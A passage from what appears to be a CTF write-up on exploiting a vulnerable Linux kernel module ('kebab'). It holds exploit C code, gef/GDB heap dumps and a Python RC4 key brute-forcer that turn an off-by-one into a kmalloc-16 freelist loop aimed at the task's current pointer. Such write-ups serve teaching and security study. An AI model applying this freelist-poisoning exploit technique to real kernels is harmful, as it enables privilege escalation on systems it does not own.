+<span class="giallo-l"><span style="color: #CBA6F7;">static void</span><span style="color: #89B4FA;font-style: italic;"> logleak</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">char</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">__s</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> unsigned long</span><span style="color: #EBA0AC;font-style: italic;"> addr</span><span style="color: #9399B2;">){</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	printf</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;[*] %s : %#lx</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">,</span><span> __s</span><span style="color: #9399B2;">,</span><span> addr</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">static void</span><span style="color: #89B4FA;font-style: italic;"> create_buf</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">int</span><span style="color: #EBA0AC;font-style: italic;"> size</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> char</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">buf</span><span style="color: #9399B2;">){</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	struct</span><span> new_secbuff_arg arg </span><span style="color: #94E2D5;">=</span><span style="color: #9399B2;"> {</span></span>
+<span class="giallo-l"><span>		.size </span><span style="color: #94E2D5;">=</span><span> size</span><span style="color: #9399B2;">,</span></span>
+<span class="giallo-l"><span>		.buffer </span><span style="color: #94E2D5;">=</span><span> buf</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">	};</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	memcpy</span><span style="color: #9399B2;">(</span><span>arg</span><span style="color: #9399B2;">.</span><span>key</span><span style="color: #9399B2;">,</span><span> key_buf</span><span style="color: #9399B2;">,</span><span> MAX_RC4_LEN</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	ioctl</span><span style="color: #9399B2;">(</span><span>fd</span><span style="color: #9399B2;">,</span><span> KEBAB_IOCTL_NEW</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> &amp;</span><span>arg</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">static void</span><span style="color: #89B4FA;font-style: italic;"> read_buf</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">unsigned long</span><span style="color: #EBA0AC;font-style: italic;"> index</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> char</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">buf</span><span style="color: #9399B2;">){</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	struct</span><span> read_secbuff_arg arg </span><span style="color: #94E2D5;">=</span><span style="color: #9399B2;"> {</span></span>
+<span class="giallo-l"><span>		.index </span><span style="color: #94E2D5;">=</span><span> index</span><span style="color: #9399B2;">,</span></span>
+<span class="giallo-l"><span>		.buffer </span><span style="color: #94E2D5;">=</span><span> buf</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">	};</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	memcpy</span><span style="color: #9399B2;">(</span><span>arg</span><span style="color: #9399B2;">.</span><span>key</span><span style="color: #9399B2;">,</span><span> key_buf</span><span style="color: #9399B2;">,</span><span> MAX_RC4_LEN</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">static void</span><span style="color: #89B4FA;font-style: italic;"> set_key</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">void</span><span style="color: #9399B2;">){</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	memcpy</span><span style="color: #9399B2;">(</span><span>leak_buf</span><span style="color: #9399B2;">,</span><span> key_buf</span><span style="color: #9399B2;">,</span><span> MAX_RC4_LEN</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span>	</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	if</span><span style="color: #9399B2;">(</span><span style="color: #89B4FA;font-style: italic;">ioctl</span><span style="color: #9399B2;">(</span><span>fd</span><span style="color: #9399B2;">,</span><span> KEBAB_IOCTL_SET_KEY</span><span style="color: #9399B2;">,</span><span> leak_buf</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> &lt;</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;"> ){</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">		printf</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;[-] Error setting the key</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">	}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	memcpy</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">&amp;</span><span>leak</span><span style="color: #9399B2;">,</span><span> leak_buf</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> sizeof</span><span style="color: #9399B2;">(</span><span>key_info</span><span style="color: #9399B2;">));</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span></code></pre>
+<p>First we will retrieve our important leak and save it in a global variable <code>current</code>;</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">set_key</span><span style="color: #9399B2;">();</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">unsigned long</span><span> current </span><span style="color: #94E2D5;">=</span><span style="color: #9399B2;"> (</span><span style="color: #CBA6F7;">unsigned long</span><span style="color: #9399B2;">)</span><span>leak.cur</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">logleak</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;task_struct current&quot;</span><span style="color: #9399B2;">,</span><span> current</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">logleak</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;PID&quot;</span><span style="color: #9399B2;">, (</span><span style="color: #CBA6F7;">unsigned long</span><span style="color: #9399B2;">)</span><span>leak.pid</span><span style="color: #9399B2;">);</span></span></code></pre>
+<p>And then we create a new 16 byte secure buffer by sending a bunch of A's.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">char</span><span> A</span><span style="color: #9399B2;">[</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">10</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> =</span><span style="color: #A6E3A1;"> &quot;AAAAAAAAAAAAAAAA&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">create_buf</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">sizeof</span><span style="color: #9399B2;">(</span><span>A</span><span style="color: #9399B2;">),</span><span> A</span><span style="color: #9399B2;">);</span></span></code></pre>
+<p>For the debugging im using <a rel="external" href="https://github.com/bata24/gef">gef</a> plugin for GDB, it has useful kernel debugging utilities.
+We can use the command <code>vmlinux-to-elf</code> to generate an ELF binary with symbols from the kernel image, this binary is what we will use to debug with GDB, <code>vmlinux-to-elf vmlinuz-4.19.306 vmlinux</code>.<br />
+We run the VM and connect with GDB <code>gdb vmlinux</code> and once we are in, <code>target remote :1234</code>. Don't forget to disable KASLR in <code>run.sh</code> file, this can be done changing the <code>kaslr</code> keyword to <code>nokaslr</code>. This way we can debug easily with only 1 import of the symbols. After connecting to the remote instance we can check the kernel base address with <code>kbase</code> and set up the symbols with <code>add-symbol-file vmlinux kbase</code>. Using vmmap we check the base address of the module</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffffffffc0002000</span><span style="color: #94E2D5;">-</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffffffffc0003000</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">0000000000001000</span><span style="color: #9399B2;"> [</span><span>r</span><span style="color: #94E2D5;">-</span><span>x</span><span style="color: #9399B2;">]</span><span> modules</span><span style="color: #9399B2;">,</span><span> kernel </span><span style="color: #89B4FA;font-style: italic;">module</span><span style="color: #9399B2;"> (</span><span>kebab</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffffffffc0003000</span><span style="color: #94E2D5;">-</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffffffffc0004000</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">0000000000001000</span><span style="color: #9399B2;"> [</span><span>r</span><span style="color: #94E2D5;">--</span><span style="color: #9399B2;">]</span><span> modules</span><span style="color: #9399B2;">,</span><span> kernel </span><span style="color: #89B4FA;font-style: italic;">module</span><span style="color: #9399B2;"> (</span><span>kebab</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffffffffc0004000</span><span style="color: #94E2D5;">-</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffffffffc0006000</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">0000000000002000</span><span style="color: #9399B2;"> [</span><span>rw</span><span style="color: #94E2D5;">-</span><span style="color: #9399B2;">]</span><span> modules</span><span style="color: #9399B2;">,</span><span> kernel </span><span style="color: #89B4FA;font-style: italic;">module</span><span style="color: #9399B2;"> (</span><span>kebab</span><span style="color: #9399B2;">)</span></span></code></pre>
+<p>We can add the module symbols the same way <code>add-symbol-file initramfs/chall/kebab_mod.ko 0xffffffffc0002000</code>. We will place 2 breakpoints, in the kmalloc we are interested in (the one used to store the encrypted data), and one after the encryption to see how it got filled.</p>
+<p><img src="/assets/kerbab/kmalloc.png" alt="alt text" /></p>
+<p>Now with a single <code>stepover</code> we can check <code>$rax</code> to see the pointer to the new chunk. We placed a breakpoint at the end of <code>rc4_crypt</code> to look at the chunk.
+This is <strong>before</strong> the encryption:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span>gef</span><span style="color: #94E2D5;">&gt;</span><span> x</span><span style="color: #94E2D5;">/</span><span>4gx $rax</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71930</span><span>:	</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71940</span><span>:	</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71950</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span><span style="color: #94E2D5;"> &lt;--</span><span> The pointer </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71950</span><span> is the next free chunk in the freelist </span></span></code></pre>
+<p><strong>After</strong> <code>rc4_crypt</code></p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span>gef</span><span style="color: #94E2D5;">&gt;</span><span> x</span><span style="color: #94E2D5;">/</span><span>4gx</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">ffff88803db71930</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71930</span><span>:	</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">e08ce2817ca78a83</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">6a74b1a51d28eafb</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71940</span><span>:	</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71977</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span></span></code></pre>
+<p>The next pointer's last byte got modified to 0x77.</p>
+<p>The kernel heap has caches for each size of allocations, for example an allocation of 1000 bytes would be in <code>kmalloc-1k</code> cache, one of 30 bytes to <code>kmalloc-32</code>, etc. In this case we are allocating objects of size 16 so our object ends up in <code>kmalloc-16</code>, we can easily verify this with gef's command <code>slab-contains 0xffff88803db71930</code></p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span>gef</span><span style="color: #94E2D5;">&gt;</span><span> slab</span><span style="color: #94E2D5;">-</span><span>contains </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71930</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">[</span><span style="color: #94E2D5;">+</span><span style="color: #9399B2;">]</span><span> Wait </span><span style="color: #CBA6F7;">for</span><span> memory scan</span></span>
+<span class="giallo-l"><span>page: </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffffea0000f6dc40</span></span>
+<span class="giallo-l"><span>kmem_cache: </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803e001a80</span></span>
+<span class="giallo-l"><span>base: </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71000</span></span>
+<span class="giallo-l"><span>name: kmalloc</span><span style="color: #94E2D5;">-</span><span style="color: #FAB387;">16</span><span>  size: </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">10</span><span>  num_pages: </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">1</span></span></code></pre>
+<p>In this kernel version, the chunks are ordered and are allocated sequentially one after the other:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span>gef</span><span style="color: #94E2D5;">&gt;</span><span> slub</span><span style="color: #94E2D5;">-</span><span>dump kmalloc</span><span style="color: #94E2D5;">-</span><span style="color: #FAB387;">16</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>...</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">091</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">ffff88803db71910</span><span style="color: #9399B2;"> (</span><span>in</span><span style="color: #94E2D5;">-</span><span>use</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">092</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">ffff88803db71920</span><span style="color: #9399B2;"> (</span><span>in</span><span style="color: #94E2D5;">-</span><span>use</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">093</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">ffff88803db71930</span><span style="color: #9399B2;"> (</span><span>in</span><span style="color: #94E2D5;">-</span><span>use</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">094</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">ffff88803db71940</span><span style="color: #9399B2;"> (</span><span>next: </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71950</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">095</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">ffff88803db71950</span><span style="color: #9399B2;"> (</span><span>next: </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71960</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">096</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">ffff88803db71960</span><span style="color: #9399B2;"> (</span><span>next: </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71970</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span>...</span></span>
+<span class="giallo-l"></span></code></pre>
+<p>Each free chunk has the address of the next chunk to be allocated. If we somehow tamper this next pointer to point to itself, we can create a loop where we allocate on top of this next pointer, and we can change it with anything we want. In this case, we could change it to the address of <code>current</code>!
+Our data chunk is always falling into <code>0xffff88803db71930</code>, and we have an off-by-one into <code>0xffff88803db71940</code>'s next pointer, if we manage to find a key that when the 16th byte is 0, the result of the encryption is 0x40 we will successfully create a loop.</p>
+<p>Cryptography is definitely not my field, so I had some trouble understanding how it worked. But RC4 is not a secure algorithm, and it can be easily reversed. So if we get an output from <code>enc(key, message)</code>, if we now <code>enc(cipher, message)</code> we will get the key back. So knowing this I created a <a href="/assets/kerbab/rc4.py">python script</a> that bruteforces this problem:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="python"><span class="giallo-l"><span style="color: #CBA6F7;">from</span><span> Crypto</span><span style="color: #9399B2;">.</span><span>Cipher</span><span style="color: #CBA6F7;"> import</span><span> ARC4</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">from</span><span> pwn</span><span style="color: #CBA6F7;"> import</span><span style="color: #94E2D5;"> *</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">def</span><span style="color: #89B4FA;font-style: italic;"> brute</span><span style="color: #9399B2;">(</span><span style="color: #EBA0AC;font-style: italic;">b</span><span style="color: #9399B2;">:</span><span style="color: #CBA6F7;font-style: italic;"> int</span><span style="color: #9399B2;">):</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    for</span><span> i</span><span style="color: #CBA6F7;"> in</span><span style="color: #FAB387;font-style: italic;"> range</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">fff</span><span style="color: #9399B2;">):</span></span>
+<span class="giallo-l"><span>        key</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;"> p16</span><span style="color: #9399B2;">(</span><span>i</span><span style="color: #9399B2;">)</span><span> </span></span>
+<span class="giallo-l"><span>        length</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;"> 1</span></span>
+<span class="giallo-l"><span>        cipher</span><span style="color: #94E2D5;"> =</span><span> ARC4</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;">new</span><span style="color: #9399B2;">(</span><span>key</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span>        buf</span><span style="color: #94E2D5;"> =</span><span style="color: #A6E3A1;font-style: italic;"> b</span><span style="color: #A6E3A1;">&#39;A&#39;</span><span style="color: #94E2D5;"> *</span><span style="color: #FAB387;"> 16</span><span style="color: #94E2D5;"> +</span><span style="color: #A6E3A1;font-style: italic;"> b</span><span style="color: #A6E3A1;">&#39;</span><span style="color: #F5C2E7;">\x00</span><span style="color: #A6E3A1;">&#39;</span></span>
+<span class="giallo-l"><span>        msg</span><span style="color: #94E2D5;"> =</span><span> cipher</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;">encrypt</span><span style="color: #9399B2;">(</span><span>buf</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">        if</span><span style="color: #EBA0AC;font-style: italic;"> msg</span><span style="color: #9399B2;">[</span><span style="color: #FAB387;font-style: italic;">16</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> ==</span><span> b</span><span style="color: #9399B2;">:</span></span>
+<span class="giallo-l"><span>            c_arr</span><span style="color: #94E2D5;"> =</span><span style="color: #A6E3A1;"> &quot;, &quot;</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;">join</span><span style="color: #9399B2;">([</span><span style="color: #A6E3A1;font-style: italic;">f</span><span style="color: #A6E3A1;">&quot;0x</span><span style="color: #F5C2E7;">{</span><span>b</span><span style="color: #CBA6F7;">:02x</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #CBA6F7;"> for</span><span> b</span><span style="color: #CBA6F7;"> in</span><span> key</span><span style="color: #9399B2;">])</span></span>
+<span class="giallo-l"><span style="color: #FAB387;font-style: italic;">            print</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;static char key_buf[MAX_RC4_LEN] = {&quot;</span><span style="color: #9399B2;">,</span><span> c_arr</span><span style="color: #9399B2;">,</span><span style="color: #A6E3A1;"> &quot; };&quot;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;">brute</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">40</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"></span></code></pre>
+<p>This produced the key 0x35, but for some reason I still don't know, it does not work, so I chose the next key 0x1dd.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellsession"><span class="giallo-l"><span>lkt@pwn:~/Desktop/ctf/kerbab/kerbab</span><span style="color: #9399B2;">$</span><span> python3 rc4.py </span></span>
+<span class="giallo-l"><span>static char key_buf[MAX_RC4_LEN] = { 0x35, 0x00  };</span></span>
+<span class="giallo-l"><span>static char key_buf[MAX_RC4_LEN] = { 0xdd, 0x01  };</span></span>
+<span class="giallo-l"><span>...</span></span></code></pre>
+<p>If we send any input with this key, we will create a loop, because the last byte will always be 0.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span>gef</span><span style="color: #94E2D5;">&gt;</span><span> x</span><span style="color: #94E2D5;">/</span><span>4gx</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">ffff88803db71930</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71930</span><span>:	</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">c892007ebe0fecff</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">90d3b4c1565fea10</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71940</span><span>:	</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71940</span><span style="color: #CBA6F7;">	0x</span><span style="color: #FAB387;">0000000000000000</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>gef</span><span style="color: #94E2D5;">&gt;</span><span> slub</span><span style="color: #94E2D5;">-</span><span>dump kmalloc</span><span style="color: #94E2D5;">-</span><span style="color: #FAB387;">16</span></span>
+<span class="giallo-l"><span>...</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">093</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">ffff88803db71930</span><span style="color: #9399B2;"> (</span><span>in</span><span style="color: #94E2D5;">-</span><span>use</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">094</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">ffff88803db71940</span><span style="color: #9399B2;"> (</span><span>next: </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">ffff88803db71940</span><span>: </span><span style="color: #89B4FA;font-style: italic;">Corrupted</span><span style="color: #9399B2;"> (</span><span>Loop </span><span style="color: #EBA0AC;font-style: italic;">detected</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">095</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">ffff88803db71950</span><span style="color: #9399B2;"> (</span><span>in</span><span style="color: #94E2D5;">-</span><span>use</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span>...</span></span></code></pre>
+<p>Now, when we <code>create_buf</code> again, there will be 2 allocations one for <code>secure_buffer</code>, and the second one for our encrypted data, and both will end up in the same address: <code>0xffff88803db71940</code>.</p>
+<p>The last step is to create a function that RC4 encrypts our input and sends it to the kernel, so when the internal <code>rc4_crypt</code> function gets called, the data gets decrypted into the kernel heap. As I said, I do not know anything about cryptography, so I simply copied the functions from the kernel driver source code.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">struct</span><span> rc4_state </span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	unsigned char</span><span>	perm</span><span style="color: #9399B2;">[</span><span style="color: #FAB387;">256</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	unsigned char</span><span>	index1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	unsigned char</span><span>	index2</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">};</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">static</span><span> __inline </span><span style="color: #CBA6F7;">void</span><span style="color: #89B4FA;font-style: italic;"> swap_bytes</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">unsigned char</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">a</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> unsigned char</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">b</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	unsigned char</span><span> temp</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>	temp </span><span style="color: #94E2D5;">= *</span><span>a</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #94E2D5;">	*</span><span>a </span><span style="color: #94E2D5;">= *</span><span>b</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #94E2D5;">	*</span><span>b </span><span style="color: #94E2D5;">=</span><span> temp</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">static void</span><span style="color: #89B4FA;font-style: italic;"> rc4_init</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">struct</span><span> rc4_state </span><span style="color: #94E2D5;">*</span><span style="color: #CBA6F7;">const</span><span style="color: #EBA0AC;font-style: italic;"> state</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> unsigned char</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">key</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> int</span><span style="color: #EBA0AC;font-style: italic;"> keylen</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	unsigned char</span><span> j</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	int</span><span> i</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	for</span><span style="color: #9399B2;"> (</span><span>i </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span><span> i </span><span style="color: #94E2D5;">&lt;</span><span style="color: #FAB387;"> 256</span><span style="color: #9399B2;">;</span><span> i</span><span style="color: #94E2D5;">++</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span>		state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>i</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> =</span><span style="color: #9399B2;"> (</span><span style="color: #CBA6F7;">unsigned char</span><span style="color: #9399B2;">)</span><span>i</span><span style="color: #9399B2;">;</span><span> </span></span>
+<span class="giallo-l"><span>	state</span><span style="color: #9399B2;">-&gt;</span><span>index1</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>	state</span><span style="color: #9399B2;">-&gt;</span><span>index2</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	for</span><span style="color: #9399B2;"> (</span><span>j </span><span style="color: #94E2D5;">=</span><span> i </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span><span> i </span><span style="color: #94E2D5;">&lt;</span><span style="color: #FAB387;"> 256</span><span style="color: #9399B2;">;</span><span> i</span><span style="color: #94E2D5;">++</span><span style="color: #9399B2;">) {</span></span>
